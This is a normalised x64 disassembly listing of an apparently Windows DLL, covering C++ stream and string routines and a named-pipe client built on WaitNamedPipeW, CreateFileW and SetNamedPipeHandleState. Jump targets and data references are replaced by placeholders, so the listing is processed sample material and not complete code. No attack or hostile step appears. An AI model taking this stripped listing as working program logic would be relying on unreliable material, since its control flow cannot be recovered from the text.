mov rax [ r11 + 0x60 ]
movsxd rcx [ rax ]
mov [ r9 ] rdx
mov rax [ r11 + 0x60 ]
lea r8 [ r8 + rcx * 2 ]
sub r8 rdx
sar r8 0x1
mov [ rax ] r8d
jmp r-xdata
sub_180004a90
mov [ rsp + 0x8 ] rbx
movsxd r10 [ r8 + 0x8 ]
mov ebx r9d
mov r9 rdx
mov rdx [ rcx + 0x48 ]
add r10 [ r8 ]
mov r11 rcx
mov rax [ rdx ]
test rax rax
je r-xdata
mov rcx [ r--data ]
cmp r10 rcx
je r-xdata
cmp [ rcx + 0x70 ] rax
jae r-xdata
mov rbx [ rsp + 0x8 ]
xor eax eax
mov [ r9 ] r10
mov [ r9 + 0x8 ] rax
mov [ r9 + 0x10 ] eax
mov rax r9
retn
test bl 0x1
je r-xdata
mov [ rcx + 0x70 ] rax
test bl 0x2
je r-xdata
mov rax [ r11 + 0x40 ]
mov r8 [ rax ]
test r8 r8
je r-xdata
mov r10 rcx
mov r8 [ rdx ]
test r8 r8
je r-xdata
test r10 r10
js r-xdata
test r10 r10
js r-xdata
mov rax [ r11 + 0x20 ]
mov rdx [ rax ]
mov rax [ r11 + 0x70 ]
sub rax rdx
sar rax 0x1
cmp r10 rax
jg r-xdata
mov rax [ r11 + 0x20 ]
mov rdx [ rax ]
mov rax [ r11 + 0x70 ]
sub rax rdx
sar rax 0x1
cmp r10 rax
jg r-xdata
mov rax [ r11 + 0x58 ]
sub rdx r8
sar rdx 0x1
add edx r10d
sub [ rax ] edx
mov rcx [ r11 + 0x40 ]
movsxd rax edx
add rax rax
add [ rcx ] rax
test bl 0x2
je r-xdata
mov rax [ r11 + 0x60 ]
sub rdx r8
sar rdx 0x1
add edx r10d
sub [ rax ] edx
mov rcx [ r11 + 0x48 ]
movsxd rax edx
add rax rax
add [ rcx ] rax
jmp r-xdata
mov rbx [ r11 + 0x48 ]
mov r8 [ rbx ]
test r8 r8
je r-xdata
mov rax [ r11 + 0x40 ]
mov rdx [ rax ]
mov rax [ r11 + 0x60 ]
movsxd rcx [ rax ]
mov [ rbx ] rdx
mov rax [ r11 + 0x60 ]
lea r8 [ r8 + rcx * 2 ]
sub r8 rdx
sar r8 0x1
mov [ rax ] r8d
jmp r-xdata
sub_180004bc0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x8 ]
lea rax [ r--data ]
mov ebx edx
mov r8 [ rdi ]
lea rcx [ rdi + 0x8 ]
movsxd r9 [ r8 + 0x4 ]
mov [ r9 + rcx - 0x8 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_180017208
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_180004c20
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180017208
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_180004c60
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x10 ]
lea rax [ r--data ]
mov ebx edx
mov r8 [ rdi ]
lea rcx [ rdi + 0x10 ]
movsxd r9 [ r8 + 0x4 ]
mov [ r9 + rcx - 0x10 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_180017208
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_180004cc0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180003e40
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_180004cf0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rsi [ rcx - 0x98 ]
mov edi edx
lea rcx [ rsi + 0x98 ]
call sub_180004400
lea rax [ r--data ]
lea rcx [ rsi + 0x98 ]
mov [ rsi + 0x98 ] rax
call sub_180017208
test dil 0x1
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rax rsi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rsi
call j_sub_180018b3c
sub_180004d50
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x18 ]
mov ebx edx
mov rax [ rdi ]
lea rcx [ rdi + 0x18 ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx - 0x18 ] rax
mov rax [ rcx - 0x8 ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx - 0x8 ] rax
mov rdx [ rcx - 0x18 ]
lea rax [ r--data ]
movsxd r8 [ rdx + 0x4 ]
mov [ r8 + rcx - 0x18 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_180017208
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_180004dd0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
test [ rcx + 0x78 ] 0x1
lea rax [ r--data ]
mov edi edx
mov [ rcx ] rax
mov rbx rcx
je r-xdata
mov rax [ rbx + 0x20 ]
xor ecx ecx
mov [ rax ] rcx
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
mov rax [ rbx + 0x28 ]
mov [ rax ] rcx
mov rax [ rbx + 0x48 ]
mov [ rax ] rcx
mov rax [ rbx + 0x60 ]
mov [ rax ] ecx
and [ rbx + 0x78 ] 0xfffffffe
mov [ rbx + 0x70 ] rcx
mov rcx rbx
call sub_180003e40
test dil 0x1
je r-xdata
mov rcx [ rcx + 0x20 ]
mov rcx [ rcx ]
call j_sub_180018b3c
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_180018b3c
sub_180004e60
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x58 ] rbx
movzx edi dl
mov rbx rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
add rcx r8
cmp [ rcx + 0x10 ] 0x0
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx 0x2
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rcx [ rcx + 0x50 ]
test rcx rcx
je r-xdata
xor r8d r8d
call sub_1800037f0
xor al al
or edx 0x4
test dil dil
jne r-xdata
call sub_180003da0
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
cmp [ rcx + 0x10 ] 0x0
jne r-xdata
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
test [ rax + rbx + 0x18 ] 0x1
je r-xdata
mov al 0x1
jmp r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x68 ]
call sub_180003910
nop
mov rcx rax
call sub_1800053a0
mov r12 rax
mov rsi [ rsp + 0x68 ]
test rsi rsi
je r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001775c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
movzx r8d ax
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
xor edi edi
cmp [ rsi + 0x8 ] rdi
cmove rdi rsi
lea rcx [ rsp + 0x60 ]
call sub_18001778c
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ r12 ]
mov edx 0x48
mov rcx r12
call [ rax + 0x10 ]
test al al
jne r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov edx [ rcx + 0x10 ]
or edx 0x1
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rdx ]
movzx r8d [ rax ]
jmp r-xdata
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
nop
dec rax
mov [ rsi + 0x8 ] rax
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
call sub_180003ee0
movzx r8d ax
jmp r-xdata
jmp r-xdata
xor r8d r8d
call sub_1800037f0
jmp r-xdata
or edx 0x4
mov edi 0xffff
cmp di r8w
jne r-xdata
sub_180005040
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rsi
mov rbx rdx
mov rdi rcx
mov [ rsp + 0x48 ] 0x0
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx ] rax
mov [ rcx + 0x8 ] 0x0
mov rax [ rcx ]
movsxd rsi [ rax + 0x4 ]
add rsi rcx
mov rcx rsi
call sub_180003960
mov [ rsi + 0x48 ] rbx
mov [ rsi + 0x50 ] 0x0
mov rcx rsi
call sub_180005300
mov [ rsi + 0x58 ] ax
cmp [ rsi + 0x48 ] 0x0
jne r-xdata
mov rax rdi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov edx [ rsi + 0x10 ]
or edx 0x4
xor r8d r8d
mov rcx rsi
call sub_1800037f0
jmp r-xdata
sub_1800050e0
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
add rcx 0x8
call sub_1800177b4
nop
mov ecx 0x8
call sub_180018a08
mov rdi rax
xor ebp ebp
test rax rax
je r-xdata
mov rdi rbp
call sub_1800175d8
mov [ rdi ] rax
call sub_180017388
mov rsi rax
xor edx edx
lea rcx [ rsp + 0x58 ]
call sub_18001775c
mov rcx [ rsi + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rcx [ rsp + 0x58 ]
call sub_18001778c
jmp r-xdata
inc rcx
mov [ rsi + 0x8 ] rcx
mov [ rbx + 0x68 ] rdi
lea rax [ rbx + 0x10 ]
mov [ rbx + 0x20 ] rax
lea rcx [ rbx + 0x18 ]
mov [ rbx + 0x28 ] rcx
lea rax [ rbx + 0x30 ]
mov [ rbx + 0x40 ] rax
lea rax [ rbx + 0x38 ]
mov [ rbx + 0x48 ] rax
lea rax [ rbx + 0x50 ]
mov [ rbx + 0x58 ] rax
lea rax [ rbx + 0x54 ]
mov [ rbx + 0x60 ] rax
mov [ rcx ] rbp
mov rax [ rbx + 0x48 ]
mov [ rax ] rbp
mov rax [ rbx + 0x60 ]
mov [ rax ] ebp
mov rax [ rbx + 0x20 ]
mov [ rax ] rbp
mov rax [ rbx + 0x40 ]
mov [ rax ] rbp
mov rax [ rbx + 0x58 ]
mov [ rax ] ebp
mov rax rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
sub_1800051d0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
sub rsp 0x40
mov eax [ rcx + 0x78 ]
mov rsi r8
mov rbp rdx
and eax 0x6
mov rbx rcx
cmp al 0x6
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x40
pop rsi
retn
mov [ rsp + 0x58 ] rdi
xor edi edi
test r8 r8
je r-xdata
add rsi rsi
mov rdx rbp
mov rcx rdi
mov r8 rsi
call sub_180018670
test [ rbx + 0x78 ] 0x4
lea r11 [ rsi + rdi ]
mov [ rbx + 0x70 ] r11
jne r-xdata
mov rax 0x7fffffffffffffff
cmp r8 rax
ja r-xdata
mov eax [ rbx + 0x78 ]
test al 0x2
jne r-xdata
mov rax [ rbx + 0x20 ]
mov rcx rsi
mov [ rax ] rdi
mov rax [ rbx + 0x40 ]
sar rcx 0x1
mov [ rax ] rdi
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] 0x0
call sub_180018524
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_180019410
int3
lea rcx [ r8 + r8 ]
call sub_180018a08
mov rdi rax
test rax rax
jne r-xdata
or [ rbx + 0x78 ] 0x1
mov rdi [ rsp + 0x58 ]
test al 0x10
mov rax [ rbx + 0x28 ]
mov rcx rdi
mov [ rax ] rdi
mov rax [ rbx + 0x48 ]
cmovne rcx r11
mov [ rax ] rcx
mov rax [ rbx + 0x60 ]
sub rsi rcx
add rsi rdi
sar rsi 0x1
mov [ rax ] esi
mov rax [ rbx + 0x40 ]
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x20 ]
mov [ rax ] rdi
mov rax [ rbx + 0x40 ]
sar rdi 0x1
mov [ rax ] 0x0
mov rax [ rbx + 0x58 ]
mov [ rax ] edi
sub_180005300
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x58 ] rsi
lea rdx [ rsp + 0x50 ]
call sub_180003910
nop
mov rcx rax
call sub_1800053a0
mov rsi rax
mov rdi [ rsp + 0x50 ]
test rdi rdi
je r-xdata
mov rax [ rsi ]
mov dl 0x20
mov rcx rsi
call [ rax + 0x50 ]
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
xor edx edx
lea rcx [ rsp + 0x48 ]
call sub_18001775c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
xor ebx ebx
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rsp + 0x48 ]
call sub_18001778c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
sub_1800053a0
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_18001775c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001775c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_18001778c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_180017388
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_18001778c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_180003210
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001775c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180018598
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180019410
int3
lea rcx [ rsp + 0x60 ]
call sub_18001778c
mov rcx rbx
call sub_1800172b8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_1800054f0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rax r8
mov r10 rdx
mov rbx rcx
xor edi edi
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
mov rcx r10
mov [ rsp + 0x30 ] edi
call sub_180002070
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov rcx rbx
mov rdx rax
mov [ rbx ] di
call sub_180001fd0
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180005550
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov r14 rdx
mov rdi rcx
xor ebx ebx
mov [ rsp + 0xa8 ] ebx
xor r13b r13b
mov [ rsp + 0xa0 ] r13b
mov r15 rcx
mov [ rsp + 0x40 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
xor edx edx
mov rcx rdi
call sub_180004e60
mov [ rsp + 0x48 ] al
test al al
je r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rdi + 0x28 ] 0x0
test r13b r13b
jne r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
lea rdx [ rsp + 0x28 ]
call sub_180003910
nop
mov rcx rax
call sub_1800053a0
mov [ rsp + 0x30 ] rax
mov r12 [ rsp + 0x28 ]
test r12 r12
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
or ebx 0x2
or r8 0xffffffffffffffff
xor edx edx
mov rcx r14
call sub_1800024a0
nop
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov r12 [ rcx + rdi + 0x28 ]
mov rax 0x7ffffffffffffffe
test r12 r12
jle r-xdata
xor edx edx
lea rcx [ rsp + 0x20 ]
call sub_18001775c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ r15 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r15 + 0x48 ]
test rcx rcx
je r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov r12 rax
cmp r12 rax
jb r-xdata
xor esi esi
cmp [ r12 + 0x8 ] rsi
cmove rsi r12
lea rcx [ rsp + 0x20 ]
call sub_18001778c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rdi
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
mov rax [ rcx ]
call [ rax + 0x30 ]
movzx esi ax
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ r12 + 0x8 ] rax
jmp r-xdata
cmp ax si
jne r-xdata
mov rax [ rdx ]
movzx esi [ rax ]
jmp r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
mov edx 0x48
movzx r8d si
call [ rax + 0x10 ]
test al al
jne r-xdata
or ebx 0x1
mov [ rsp + 0xa8 ] ebx
jmp r-xdata
mov eax 0xffff
test r12 r12
je r-xdata
movzx edx si
mov rcx r14
call sub_180005950
mov r13b 0x1
mov [ rsp + 0xa0 ] r13b
dec r12
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdi + 0x48 ]
call sub_180003ee0
movzx esi ax
jmp r-xdata
sub_180005780
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r12 rdx
mov rdi rcx
xor ebx ebx
mov [ rsp + 0x98 ] ebx
xor sil sil
mov [ rsp + 0x90 ] sil
mov r13 rcx
mov [ rsp + 0x28 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov dl 0x1
mov rcx rdi
call sub_180004e60
mov [ rsp + 0x30 ] al
test al al
je r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
or ebx 0x2
or r8 0xffffffffffffffff
xor edx edx
mov rcx r12
call sub_1800024a0
mov r15d 0x22
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov rax [ r13 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r13 + 0x48 ]
test rcx rcx
je r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax rdi
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
cmp ax r15w
jne r-xdata
or ebx 0x1
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ r12 + 0x10 ] rcx
jb r-xdata
mov sil 0x1
mov [ rsp + 0x90 ] sil
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x98 ] ebx
mov r14d 0xffff
movzx edx ax
mov rcx r12
call sub_180005950
mov sil 0x1
mov [ rsp + 0x90 ] sil
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdi + 0x48 ]
call sub_180003ee0
jmp r-xdata
or ebx 0x2
mov rax [ rcx ]
call [ rax + 0x38 ]
jmp r-xdata
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
test sil sil
jne r-xdata
mov rcx 0x7ffffffffffffffe
cmp r14w ax
jne r-xdata
jmp r-xdata
dec [ rax ]
mov rax [ rcx + 0x40 ]
add [ rax ] 0x2
jmp r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
sub_180005950
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi [ rcx + 0x10 ]
or rax 0xffffffffffffffff
movzx esi dx
sub rax rdi
mov rbx rcx
cmp rax 0x1
ja r-xdata
inc rdi
mov rdx rdi
call sub_180002540
test al al
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rbx + 0x18 ] 0x8
mov rcx [ rbx + 0x10 ]
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rcx * 2 ] si
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
xor ecx ecx
mov [ rax + rdi * 2 ] cx
sub_1800059e0
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x50
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov rdi r8
mov rsi rdx
mov rbp rcx
mov [ rsp + 0x20 ] rcx
mov [ rsp + 0x30 ] rdx
mov [ rsp + 0x38 ] r8
lea rax [ r--data ]
mov [ rcx ] rax
mov [ rcx + 0x8 ] 0xffffffffffffffff
mov [ rcx + 0x28 ] 0x7
xor r12d r12d
mov [ rcx + 0x20 ] r12
mov [ rcx + 0x10 ] r12w
lea r8d [ r12 + 0x2 ]
lea rdx [ r--data ]
add rcx 0x10
call sub_1800023b0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
lea rcx [ rbp + 0x10 ]
call sub_180002070
lea r8d [ r12 + 0x6 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x10 ]
call sub_180002150
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
lea rcx [ rbp + 0x10 ]
call sub_180002070
nop
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r12
mov [ rsi ] r12w
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsi ]
call j_sub_180018b3c
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r12
mov [ rdi ] r12w
mov rax rbp
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_180018450
add rsp 0x50
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rdi ]
call j_sub_180018b3c
sub_180005af0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov edi edx
mov [ rcx ] rax
mov rcx [ rcx + 0x8 ]
cmp rcx 0xffffffffffffffff
je r-xdata
cmp [ rbx + 0x28 ] 0x8
jb r-xdata
test rcx rcx
je r-xdata
xor eax eax
mov [ rbx + 0x28 ] 0x7
mov [ rbx + 0x20 ] rax
mov [ rbx + 0x10 ] ax
test dil 0x1
je r-xdata
mov rcx [ rbx + 0x10 ]
call j_sub_180018b3c
call [ FlushFileBuffers@IAT ]
mov rcx [ rbx + 0x8 ]
call [ DisconnectNamedPipe@IAT ]
mov rcx [ rbx + 0x8 ]
call [ CloseHandle@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_180018b3c
sub_180005b70
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rcx 0xffffffffffffffff
je r-xdata
xor al al
add rsp 0x20
pop rbx
retn
test rcx rcx
je r-xdata
call [ FlushFileBuffers@IAT ]
mov rcx [ rbx + 0x8 ]
call [ DisconnectNamedPipe@IAT ]
mov rcx [ rbx + 0x8 ]
call [ CloseHandle@IAT ]
cmp eax 0x1
sete al
add rsp 0x20
pop rbx
retn
sub_180005bc0
push rdi
sub rsp 0x40
mov rdi rcx
mov rcx [ rcx + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x28 ] 0x8
mov [ rsp + 0x58 ] rbx
lea rbx [ rdi + 0x10 ]
jb r-xdata
cmp rcx 0xffffffffffffffff
je r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
xor al al
add rsp 0x40
pop rdi
retn
xor al al
mov rbx [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor edx edx
call [ WaitNamedPipeW@IAT ]
test eax eax
je r-xdata
xor eax eax
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
mov edx 0xc0000000
mov rcx rbx
mov [ rsp + 0x20 ] 0x3
call [ CreateFileW@IAT ]
mov [ rdi + 0x8 ] rax
cmp rax 0xffffffffffffffff
je r-xdata
mov rbx [ rbx ]
lea rdx [ rsp + 0x50 ]
xor r9d r9d
xor r8d r8d
mov rcx rax
mov [ rsp + 0x50 ] 0x2
call [ SetNamedPipeHandleState@IAT ]
test eax eax
setne bl
test bl bl
jne r-xdata
movzx eax bl
mov rbx [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx rdi
call sub_180005b70
sub_180005c90
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov rbp rcx
xor r15d r15d
or r14 0xffffffffffffffff
xor eax eax
mov rcx r14
mov rdi rbp
[ rdi ]
mov r12 rdx
mov [ rsp + 0x80 ] r15d
not rcx
mov edi r15d
mov rsi rbp
lea r13 [ rcx - 0x1 ]
inc r13
mov rbx r13
je r-xdata
inc rdi
mov eax 0x2
mul rdi
cmovo rax r14
mov rcx rax
call j_sub_180018a08
mov [ rsp + 0x88 ] r15d
mov rsi rax
mov rbx rax
test rdi rdi
je r-xdata
nop [ rax + rax ] eax
mov [ rbx ] r15w
mov rbx [ rsp + 0x78 ]
mov rax rsi
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
nop [ rax + rax ] eax
cdqe
inc rdi
add rsi rax
sub rbx rax
jne r-xdata
cdqe
add rbx 0x2
add rbp rax
dec rdi
